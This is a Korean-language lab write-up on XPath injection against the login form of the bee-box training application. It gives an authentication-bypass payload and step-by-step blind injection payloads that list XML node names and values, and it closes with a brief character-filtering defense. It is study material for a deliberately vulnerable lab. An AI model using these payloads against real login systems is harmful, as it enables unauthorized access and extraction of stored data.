# [beebox]XPath Injection (Login Form)

## XPath Injection?

XML 구조에 악의적인 행위를 일으키는 내용을 삽입하거나 Xpath를 조작하여 XML의 내용을 노출하는 취약점이다.

Xpath는 일종의 쿼리로, XML 데이터베이스 내용을 선택하고 조작하기 위하여 사용한다.

<br>

## Level. low

![](../img/Study%20Img/%5Bbeebox%5DXPath%20Injection%20(Login%20Form)%20-%201.png)

<br>

작은 따음표 ' 를 입력하여 취약한 부분인지 확인한다. (Loingn, Password 어디에 넣어도 상관 없음)

오류 메세지에 XML과 관련된 경고가 표시된다. Xpath 관련 오류이다.

<br>

![](../img/Study%20Img/%5Bbeebox%5DXPath%20Injection%20(Login%20Form)%20-%202.png)

<br>

로그인 페이지라서 AND 연산을 한다고 추측할 수 있고 OR 연산보다 AND 연산이 우선 순위가 높기 때문에 OR 연산과 항상 참이 되는 값을 입력하면 결과는 참이 된다.

```
id = '' AND pw = ''

' or 1=1 or '

>>>
id = '' or 1=1 or '' AND pw = '' 
```

아이디에 조작한 쿼리를 입력하고 비밀번호에는 아무값이나 입력한다.

인젝션 결과 neo 라는 사용자로 로그인이 됩니다.

<br>

![](../img/Study%20Img/%5Bbeebox%5DXPath%20Injection%20(Login%20Form)%20-%204.png)

<br>

로그인 페이지는 로그인 성공과 실패로만 응답을 하기 때문에 쿼리입력에 따른 Blind Injection이 가능하게 됩니다.

데이터베이스 구조를 파악하기 위해서는 노드의 개수를 파악하는 count 함수를 사용합니다.

../child::* = 최상위 루트에서 모든 자식노드를 조회

즉, 부모노드의 자식노드의 총 개수를 파악합니다.

```
neo' and count(../child::*)=6 or 'a'='b
```

1부터 입력한 결과 부모 노드의 자식노드는 총 6개입니다.

<br>

### 부모노드 이름 알기 (이름 길이 구하기)

이번에는 부모노드의 이름 확인합니다.

parent::* = 모든 부모 노드 조회 (여기에서는 하나만 존재함)

name = 노드명 출력

string-length = 문자열의 길이 추출

```
neo' and string-length(name(parent::*))=6 or 'a'='b
```

부모노드 이름의 길이는 6입니다.

<br>

### 부모노드 이름 알기 (이름 구하기)

부모노드의 이름에서 첫번째 부터 첫번째까지 글자구하기 

a부터 입력한 결과 첫번쨰 글자는 'h'입니다.

```
neo' and substring(name(parent::*),1,1)='h' or 'a'='b
```

그렇게 확인한 결과 부모노드의 이름은 'heroes' 입니다.

<br>

### 자식노드 이름 알기 (이름 길이 구하기)

position은 limit의 역할을 합니다.

즉, 6개의 자식 노드들 첫번째 자식 노드의 길이를 구하는 쿼리입니다.

```
neo' and string-length(name(../child::*[position()=1]))=4 or 'a'='b
```

<br>

### 자식노드 이름 알기 (이름 구하기)

```
neo' and substring(name(../child::*[position()=1]),1,1)='h' or 'a'='b
```

a부터 입력한 결과 첫번쨰 글자는 'h'입니다.

그렇게 확인한 결과 첫번째 자식노드의 이름은 'hero' 입니다.

이런식으로 모든 자식노드의 이름을 확인한 결과 모두 'hero' 이었습니다.

<br>

### 현재 노드의 자식 노드 구하기 (현재 노드 이름 구하기)

```
neo' and substring(name(.),1,1)='h' or 'a'='b
```

현재노드의 이름은 'hero' 입니다.

<br>

### 현재 노드의 자식 노드 구하기 (현재 노드의 자식 개수 구하기)

```
neo' and count(/heroes/hero/child::*)=6 or 'a'='b
```

1부터 입력한 결과 자식노드의 개수는 6개 입니다.

<br>

### 현재 노드의 자식 노드 구하기

위 과정과 같은 방법으로 현재 노드의 자식 노드를 구할수 있습니다.

```
neo' and string-length(name(//hero[1]/child::*[position()=1]))=2 or 'a'='b
```

```
neo' and substring(name(//hero[1]/child::*[position()=1]),1,1)='i' or 'a'='b
```

```
neo' and string-length(string(//hero[1]/id))=1 or 'a'='b
```

```
neo' and substring(string(//hero[1]/id),1,1)=1 or 'a'='b
```

이 과정을 거치면서 자식노드 id를 확인했고 id에는 1이 저장되어 있습니다.

<br>

## 🛡 Denfensive techniques

replace 함수를 이용해서 인젝션에 사용되는 문자를 공백으로 대체합니다.

' [ ] : , * / 스페이스바 를 공백으로 대체합니다. 즉, 필터링 합니다.